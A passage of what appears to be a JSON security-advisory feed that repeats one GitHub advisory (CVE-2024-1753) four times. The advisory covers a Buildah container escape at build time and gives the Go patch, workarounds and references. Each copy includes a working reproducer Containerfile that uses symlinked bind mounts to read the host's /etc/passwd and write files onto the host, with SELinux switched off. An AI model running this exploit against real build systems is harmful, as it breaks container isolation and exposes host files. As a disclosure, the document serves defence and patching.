-a\nbuildah rmi -a\nrm /BIND_BREAKOUT\nrm /etc/BIND_BREAKOUT2\nsetenforce 1\nbuildah build -f ~/cve_Containerfile .\n</code></pre>\n<p>Neither the <code>/BIND_BREAKEOUT</code> or <code>/etc/BIND_BREAKOUT2</code> files should be created.  An error should be raised during the build when both files are trying to be created.  Also, errors will be raised when the build tries to display the contents of the <code>/etc/passwd</code> file, and nothing will be displayed from that file.  </p>\n<p>However, the files in both the <code>/</code> and <code>/etc</code> directories on the host system will be displayed.</p>\n<h5 id=\"testing-with-the-patch\">Testing with the patch</h5>\n<p>Use the same commands as testing with an older version of Buildah.</p>\n<p>When running using the patched version of Buildah, regardless of the <code>setenforce</code> settings,  you should not see the file that you created or the user that you added.  Also the <code>/BIND_BREAKOUT</code> and the <code>/etc/BIND_BREAKOUT</code> will not exist on the host after the test completes.</p>\n<p>NOTE: With the fix, the contents of the <code>/</code> and <code>/etc</code> directories, and the <code>/etc/passwd</code> file will be displayed, however, it will be the file and contents from the container image, and NOT the host system.  Also the <code>/BIND_BREAKOUT</code> and <code>/etc/BIND_BREAKOUT</code> files will be created in the container image.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Ensure selinux controls are in place to avoid compromising sensitive system files and systems.  With \"setenforce 0\" set, which is not at all advised, the root file system is open for modification with this exploit.  With \"setenfoce 1\" set, which is the recommendation, files can not be changed.  However, the contents of the <code>/</code> directory can be displayed.  I.e., <code>ls -alF /</code> will show the contents of the host directory.</p>\n<h3 id=\"references\">References</h3>\n<p>Unknown.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf\">https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf</a></li>\n<li><a href=\"https://github.com/containers/buildah/commit/9de9c20ff368beb84b84fe660773d352519dc1c5\">https://github.com/containers/buildah/commit/9de9c20ff368beb84b84fe660773d352519dc1c5</a></li>\n<li><a href=\"https://github.com/containers/buildah/commit/3deda19137f5dec0285bbb832bd93c22d860b087\">https://github.com/containers/buildah/commit/3deda19137f5dec0285bbb832bd93c22d860b087</a></li>\n<li><a href=\"https://github.com/containers/buildah/commit/a030f7b8cd373075affef1f86de43a87e502f3d8\">https://github.com/containers/buildah/commit/a030f7b8cd373075affef1f86de43a87e502f3d8</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=2265513\">https://bugzilla.redhat.com/show_bug.cgi?id=2265513</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-1753\">https://nvd.nist.gov/vuln/detail/CVE-2024-1753</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pmf3-c36m-g5cf\">https://github.com/advisories/GHSA-pmf3-c36m-g5cf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pmf3-c36m-g5cf",
            "title": "[github.com/containers/buildah] Container escape at build time",
            "date_modified": "2024-04-20T05:05:26.000Z",
            "date_published": "2024-03-19T20:06:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pmf3-c36m-g5cf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p><em>What kind of vulnerability is it? Who is impacted?</em></p>\n<p>Users running containers with root privileges allowing a container to run with read/write access to the host system files when selinux is not enabled.  With selinux enabled, some read access is allowed.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>From @nalind </p>\n<pre><code># cat /root/cve-2024-1753.diff\n--- internal/volumes/volumes.go\n+++ internal/volumes/volumes.go\n@@ -11,6 +11,7 @@ import (\n \n     \"errors\"\n \n+\t\"github.com/containers/buildah/copier\"\n     \"github.com/containers/buildah/define\"\n     \"github.com/containers/buildah/internal\"\n     internalParse \"github.com/containers/buildah/internal/parse\"\n@@ -189,7 +190,11 @@ func GetBindMount(ctx *types.SystemContext, args []string, contextDir string, st\n     // buildkit parity: support absolute path for sources from current build context\n     if contextDir != \"\" {\n         // path should be /contextDir/specified path\n-\t\tnewMount.Source = filepath.Join(contextDir, filepath.Clean(string(filepath.Separator)+newMount.Source))\n+\t\tevaluated, err := copier.Eval(contextDir, newMount.Source, copier.EvalOptions{})\n+\t\tif err != nil {\n+\t\t\treturn newMount, \"\", err\n+\t\t}\n+\t\tnewMount.Source = evaluated\n     } else {\n         // looks like its coming from `build run --mount=type=bind` allow using absolute path\n         // error out if no source is set\n</code></pre>\n<h3 id=\"reproducer\">Reproducer</h3>\n<p>Prior to testing, as root, add a memorable username to <code>/etc/passwd</code> via adduser or your favorite editor.   Also create a memorably named file in <code>/</code>.  Suggest: <code>touch /SHOULDNTSEETHIS.txt</code> and <code>adduser SHOULDNTSEETHIS</code>.  After testing, remember to remove both the file and the user from your system.</p>\n<p>Use the following Containerfile</p>\n<pre><code># cat ~/cve_Containerfile\nFROM alpine as base\n\nRUN ln -s / /rootdir\nRUN ln -s /etc /etc2\n\nFROM alpine\n\nRUN echo \"ls container root\"\nRUN ls -l /\n\nRUN echo \"With exploit show host root, not the container's root, and create /BIND_BREAKOUT in / on the host\"\nRUN --mount=type=bind,from=base,source=/rootdir,destination=/exploit,rw ls -l /exploit; touch /exploit/BIND_BREAKOUT; ls -l /exploit\n\nRUN echo \"With exploit show host /etc/passwd, not the container's, and create /BIND_BREAKOUT2 in /etc on the host\"\nRUN --mount=type=bind,rw,source=/etc2,destination=/etc2,from=base ls -l /; ls -l /etc2/passwd; cat /etc2/passwd; touch /etc2/BIND_BREAKOUT2; ls -l /etc2 \n</code></pre>\n<h4 id=\"to-test\">To Test</h4>\n<h5 id=\"testing-with-an-older-version-of-buildah-with-the-issue\">Testing with an older version of Buildah with the issue</h5>\n<pre><code>setenforce 0\nbuildah build -f ~/cve_Containerfile .\n</code></pre>\n<p>As part of the printout from the build, you should be able to see the contents of the <code>/' and </code>/etc<code>directories, including the</code>/SHOULDNOTSEETHIS.txt<code>file that you created, and the contents of the</code>/etc/passwd<code>file which will include the</code>SHOULDNOTSEETHIS<code>user that you created.  In addition, the file</code>/BIND_BREAKOUT<code>and</code>/etc/BIND_BREAKOUT2` will exist on the host after the command is completed.  Be sure to remove those two files between tests.  </p>\n<pre><code>buildah rm -a\nbuildah rmi -a\nrm /BIND_BREAKOUT\nrm /etc/BIND_BREAKOUT2\nsetenforce 1\nbuildah build -f ~/cve_Containerfile .\n</code></pre>\n<p>Neither the <code>/BIND_BREAKEOUT</code> or <code>/etc/BIND_BREAKOUT2</code> files should be created.  An error should be raised during the build when both files are trying to be created.  Also, errors will be raised when the build tries to display the contents of the <code>/etc/passwd</code> file, and nothing will be displayed from that file.  </p>\n<p>However, the files in both the <code>/</code> and <code>/etc</code> directories on the host system will be displayed.</p>\n<h5 id=\"testing-with-the-patch\">Testing with the patch</h5>\n<p>Use the same commands as testing with an older version of Buildah.</p>\n<p>When running using the patched version of Buildah, regardless of the <code>setenforce</code> settings,  you should not see the file that you created or the user that you added.  Also the <code>/BIND_BREAKOUT</code> and the <code>/etc/BIND_BREAKOUT</code> will not exist on the host after the test completes.</p>\n<p>NOTE: With the fix, the contents of the <code>/</code> and <code>/etc</code> directories, and the <code>/etc/passwd</code> file will be displayed, however, it will be the file and contents from the container image, and NOT the host system.  Also the <code>/BIND_BREAKOUT</code> and <code>/etc/BIND_BREAKOUT</code> files will be created in the container image.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Ensure selinux controls are in place to avoid compromising sensitive system files and systems.  With \"setenforce 0\" set, which is not at all advised, the root file system is open for modification with this exploit.  With \"setenfoce 1\" set, which is the recommendation, files can not be changed.  However, the contents of the <code>/</code> directory can be displayed.  I.e., <code>ls -alF /</code> will show the contents of the host directory.</p>\n<h3 id=\"references\">References</h3>\n<p>Unknown.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf\">https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf</a></li>\n<li><a href=\"https://github.com/containers/buildah/commit/9de9c20ff368beb84b84fe660773d352519dc1c5\">https://github.com/containers/buildah/commit/9de9c20ff368beb84b84fe660773d352519dc1c5</a></li>\n<li><a href=\"https://github.com/containers/buildah/commit/3deda19137f5dec0285bbb832bd93c22d860b087\">https://github.com/containers/buildah/commit/3deda19137f5dec0285bbb832bd93c22d860b087</a></li>\n<li><a href=\"https://github.com/containers/buildah/commit/a030f7b8cd373075affef1f86de43a87e502f3d8\">https://github.com/containers/buildah/commit/a030f7b8cd373075affef1f86de43a87e502f3d8</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=2265513\">https://bugzilla.redhat.com/show_bug.cgi?id=2265513</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-1753\">https://nvd.nist.gov/vuln/detail/CVE-2024-1753</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pmf3-c36m-g5cf\">https://github.com/advisories/GHSA-pmf3-c36m-g5cf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pmf3-c36m-g5cf",
            "title": "[github.com/containers/buildah] Container escape at build time",
            "date_modified": "2024-04-20T05:05:26.000Z",
            "date_published": "2024-03-19T20:06:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pmf3-c36m-g5cf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p><em>What kind of vulnerability is it? Who is impacted?</em></p>\n<p>Users running containers with root privileges allowing a container to run with read/write access to the host system files when selinux is not enabled.  With selinux enabled, some read access is allowed.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>From @nalind </p>\n<pre><code># cat /root/cve-2024-1753.diff\n--- internal/volumes/volumes.go\n+++ internal/volumes/volumes.go\n@@ -11,6 +11,7 @@ import (\n \n     \"errors\"\n \n+\t\"github.com/containers/buildah/copier\"\n     \"github.com/containers/buildah/define\"\n     \"github.com/containers/buildah/internal\"\n     internalParse \"github.com/containers/buildah/internal/parse\"\n@@ -189,7 +190,11 @@ func GetBindMount(ctx *types.SystemContext, args []string, contextDir string, st\n     // buildkit parity: support absolute path for sources from current build context\n     if contextDir != \"\" {\n         // path should be /contextDir/specified path\n-\t\tnewMount.Source = filepath.Join(contextDir, filepath.Clean(string(filepath.Separator)+newMount.Source))\n+\t\tevaluated, err := copier.Eval(contextDir, newMount.Source, copier.EvalOptions{})\n+\t\tif err != nil {\n+\t\t\treturn newMount, \"\", err\n+\t\t}\n+\t\tnewMount.Source = evaluated\n     } else {\n         // looks like its coming from `build run --mount=type=bind` allow using absolute path\n         // error out if no source is set\n</code></pre>\n<h3 id=\"reproducer\">Reproducer</h3>\n<p>Prior to testing, as root, add a memorable username to <code>/etc/passwd</code> via adduser or your favorite editor.   Also create a memorably named file in <code>/</code>.  Suggest: <code>touch /SHOULDNTSEETHIS.txt</code> and <code>adduser SHOULDNTSEETHIS</code>.  After testing, remember to remove both the file and the user from your system.</p>\n<p>Use the following Containerfile</p>\n<pre><code># cat ~/cve_Containerfile\nFROM alpine as base\n\nRUN ln -s / /rootdir\nRUN ln -s /etc /etc2\n\nFROM alpine\n\nRUN echo \"ls container root\"\nRUN ls -l /\n\nRUN echo \"With exploit show host root, not the container's root, and create /BIND_BREAKOUT in / on the host\"\nRUN --mount=type=bind,from=base,source=/rootdir,destination=/exploit,rw ls -l /exploit; touch /exploit/BIND_BREAKOUT; ls -l /exploit\n\nRUN echo \"With exploit show host /etc/passwd, not the container's, and create /BIND_BREAKOUT2 in /etc on the host\"\nRUN --mount=type=bind,rw,source=/etc2,destination=/etc2,from=base ls -l /; ls -l /etc2/passwd; cat /etc2/passwd; touch /etc2/BIND_BREAKOUT2; ls -l /etc2 \n</code></pre>\n<h4 id=\"to-test\">To Test</h4>\n<h5 id=\"testing-with-an-older-version-of-buildah-with-the-issue\">Testing with an older version of Buildah with the issue</h5>\n<pre><code>setenforce 0\nbuildah build -f ~/cve_Containerfile .\n</code></pre>\n<p>As part of the printout from the build, you should be able to see the contents of the <code>/' and </code>/etc<code>directories, including the</code>/SHOULDNOTSEETHIS.txt<code>file that you created, and the contents of the</code>/etc/passwd<code>file which will include the</code>SHOULDNOTSEETHIS<code>user that you created.  In addition, the file</code>/BIND_BREAKOUT<code>and</code>/etc/BIND_BREAKOUT2` will exist on the host after the command is completed.  Be sure to remove those two files between tests.  </p>\n<pre><code>buildah rm -a\nbuildah rmi -a\nrm /BIND_BREAKOUT\nrm /etc/BIND_BREAKOUT2\nsetenforce 1\nbuildah build -f ~/cve_Containerfile .\n</code></pre>\n<p>Neither the <code>/BIND_BREAKEOUT</code> or <code>/etc/BIND_BREAKOUT2</code> files should be created.  An error should be raised during the build when both files are trying to be created.  Also, errors will be raised when the build tries to display the contents of the <code>/etc/passwd</code> file, and nothing will be displayed from that file.  </p>\n<p>However, the files in both the <code>/</code> and <code>/etc</code> directories on the host system will be displayed.</p>\n<h5 id=\"testing-with-the-patch\">Testing with the patch</h5>\n<p>Use the same commands as testing with an older version of Buildah.</p>\n<p>When running using the patched version of Buildah, regardless of the <code>setenforce</code> settings,  you should not see the file that you created or the user that you added.  Also the <code>/BIND_BREAKOUT</code> and the <code>/etc/BIND_BREAKOUT</code> will not exist on the host after the test completes.</p>\n<p>NOTE: With the fix, the contents of the <code>/</code> and <code>/etc</code> directories, and the <code>/etc/passwd</code> file will be displayed, however, it will be the file and contents from the container image, and NOT the host system.  Also the <code>/BIND_BREAKOUT</code> and <code>/etc/BIND_BREAKOUT</code> files will be created in the container image.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Ensure selinux controls are in place to avoid compromising sensitive system files and systems.  With \"setenforce 0\" set, which is not at all advised, the root file system is open for modification with this exploit.  With \"setenfoce 1\" set, which is the recommendation, files can not be changed.  However, the contents of the <code>/</code> directory can be displayed.  I.e., <code>ls -alF /</code> will show the contents of the host directory.</p>\n<h3 id=\"references\">References</h3>\n<p>Unknown.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf\">https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf</a></li>\n<li><a href=\"https://github.com/containers/buildah/commit/9de9c20ff368beb84b84fe660773d352519dc1c5\">https://github.com/containers/buildah/commit/9de9c20ff368beb84b84fe660773d352519dc1c5</a></li>\n<li><a href=\"https://github.com/containers/buildah/commit/3deda19137f5dec0285bbb832bd93c22d860b087\">https://github.com/containers/buildah/commit/3deda19137f5dec0285bbb832bd93c22d860b087</a></li>\n<li><a href=\"https://github.com/containers/buildah/commit/a030f7b8cd373075affef1f86de43a87e502f3d8\">https://github.com/containers/buildah/commit/a030f7b8cd373075affef1f86de43a87e502f3d8</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=2265513\">https://bugzilla.redhat.com/show_bug.cgi?id=2265513</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-1753\">https://nvd.nist.gov/vuln/detail/CVE-2024-1753</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pmf3-c36m-g5cf\">https://github.com/advisories/GHSA-pmf3-c36m-g5cf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pmf3-c36m-g5cf",
            "title": "[github.com/containers/buildah] Container escape at build time",
            "date_modified": "2024-04-20T05:05:26.000Z",
            "date_published": "2024-03-19T20:06:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pmf3-c36m-g5cf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p><em>What kind of vulnerability is it? Who is impacted?</em></p>\n<p>Users running containers with root privileges allowing a container to run with read/write access to the host system files when selinux is not enabled.  With selinux enabled, some read access is allowed.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>From @nalind </p>\n<pre><code># cat /root/cve-2024-1753.diff\n--- internal/volumes/volumes.go\n+++ internal/volumes/volumes.go\n@@ -11,6 +11,7 @@ import (\n \n     \"errors\"\n \n+\t\"github.com/containers/buildah/copier\"\n     \"github.com/containers/buildah/define\"\n     \"github.com/containers/buildah/internal\"\n     internalParse \"github.com/containers/buildah/internal/parse\"\n@@ -189,7 +190,11 @@ func GetBindMount(ctx *types.SystemContext, args []string, contextDir string, st\n     // buildkit parity: support absolute path for sources from current build context\n     if contextDir != \"\" {\n         // path should be /contextDir/specified path\n-\t\tnewMount.Source = filepath.Join(contextDir, filepath.Clean(string(filepath.Separator)+newMount.Source))\n+\t\tevaluated, err := copier.Eval(contextDir, newMount.Source, copier.EvalOptions{})\n+\t\tif err != nil {\n+\t\t\treturn newMount, \"\", err\n+\t\t}\n+\t\tnewMount.Source = evaluated\n     } else {\n         // looks like its coming from `build run --mount=type=bind` allow using absolute path\n         // error out if no source is set\n</code></pre>\n<h3 id=\"reproducer\">Reproducer</h3>\n<p>Prior to testing, as root, add a memorable username to <code>/etc/passwd</code> via adduser or your favorite editor.   Also create a memorably named file in <code>/</code>.  Suggest: <code>touch /SHOULDNTSEETHIS.txt</code> and <code>adduser SHOULDNTSEETHIS</code>.  After testing, remember to remove both the file and the user from your system.</p>\n<p>Use the following Containerfile</p>\n<pre><code># cat ~/cve_Containerfile\nFROM alpine as base\n\nRUN ln -s / /rootdir\nRUN ln -s /etc /etc2\n\nFROM alpine\n\nRUN echo \"ls container root\"\nRUN ls -l /\n\nRUN echo \"With exploit show host root, not the container's root, and create /BIND_BREAKOUT in / on the host\"\nRUN --mount=type=bind,from=base,source=/rootdir,destination=/exploit,rw ls -l /exploit; touch /exploit/BIND_BREAKOUT; ls -l /exploit\n\nRUN echo \"With exploit show host /etc/passwd, not the container's, and create /BIND_BREAKOUT2 in /etc on the host\"\nRUN --mount=type=bind,rw,source=/etc2,destination=/etc2,from=base ls -l /; ls -l /etc2/passwd; cat /etc2/passwd; touch /etc2/BIND_BREAKOUT2; ls -l /etc2 \n</code></pre>\n<h4 id=\"to-test\">To Test</h4>\n<h5 id=\"testing-with-an-older-version-of-buildah-with-the-issue\">Testing with an older version of Buildah with the issue</h5>\n<pre><code>setenforce 0\nbuildah build -f ~/cve_Containerfile .\n</code></pre>\n<p>As part of the printout from the build, you should be able to see the contents of the <code>/' and </code>/etc<code>directories, including the</code>/SHOULDNOTSEETHIS.txt<code>file that you created, and the contents of the</code>/etc/passwd<code>file which will include the</code>SHOULDNOTSEETHIS<code>user that you created.  In addition, the file</code>/BIND_BREAKOUT<code>and</code>/etc/BIND_BREAKOUT2` will exist on the host after the command is completed.  Be sure to remove those two files between tests.  </p>\n<pre><code>buildah rm -a\nbuildah rmi -a\nrm /BIND_BREAKOUT\nrm /etc/BIND_BREAKOUT2\nsetenforce 1\nbuildah build -f ~/cve_Containerfile .\n</code></pre>\n<p>Neither the <code>/BIND_BREAKEOUT</code> or <code>/etc/BIND_BREAKOUT2</code> files should be created.  An error should be raised during the build when both files are trying to be created.  Also, errors will be raised when the build tries to display the contents of the <code>/etc/passwd</code> file, and nothing will be displayed from that file.  </p>\n<p>However, the files in both the <code>/</code> and <code>/etc</code> directories on the host system will be displayed.</p>\n<h5 id=\"testing-with-the-patch\">Testing with the patch</h5>\n<p>Use the same commands as testing with an older version of Buildah.</p>\n<p>When running using the patched version of Buildah, regardless of the <code>setenforce</code> settings,  you should not see the file that you created or the user that you added.  Also the <code>/BIND_BREAKOUT</code> and the <code>/etc/BIND_BREAKOUT</code> will not exist on the host after the test completes.</p>\n<p>NOTE: With the fix, the contents of the <code>/</code> and <code>/etc</code> directories, and the <code>/etc/passwd</code> file will be displayed, however, it will be the file and contents from the container image, and NOT the host system.  Also the <code>/BIND_BREAKOUT</code> and <code>/etc/BIND_BREAKOUT</code> files will be created in the container image.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Ensure selinux controls are in place to avoid compromising sensitive system files and systems.  With \"setenforce 0\" set, which is not at all advised, the root file system is open for modification with this exploit.  With \"setenfoce 1\" set, which is the recommendation, files can not be changed.  However, the contents of the <code>/</code> directory can be displayed.  I.e., <code>ls -alF /</code> will show the contents of the host directory.</p>\n<h3 id=\"references\">References</h3>\n<p>Unknown.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf\">https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf</a></li>\n<li><a href=\"https://github.com/containers/buildah/commit/9de9c20ff368beb84b84fe660773d352519dc1c5\">https://github.com/containers/buildah/commit/9de9c20ff368beb84b84fe660773d352519dc1c5</a></li>\n<li><a href=\"https://github.com/containers/buildah/commit/3deda19137f5dec0285bbb832bd93c22d860b087\">https://github.com/containers/buildah/commit/3deda19137f5dec0285bbb832bd93c22d860b087</a></li>\n<li><a href=\"https://github.com/containers/buildah/commit/a030f7b8cd373075affef1f86de43a87e502f3d8\">https://github.com/containers/buildah/commit/a030f7b8cd373075affef1f86de43a87e502f3d8</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=2265513\">https://bugzilla.redhat.com/show_bug.cgi?id=2265513</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-1753\">https://nvd.nist.gov/vuln/detail/CVE-2024-1753</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pmf3-c36m-g5cf\">https://github.com/advisories/GHSA-pmf3-c36m-g5cf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pmf3-c36m-g5cf",
            "title": "[github.com/containers/buildah] Container escape at build time",
            "date_modified": "2024-04-20T05:05:26.000Z",
            "date_published": "2024-03-19T20:06:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pmf3-c36m-g5cf"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}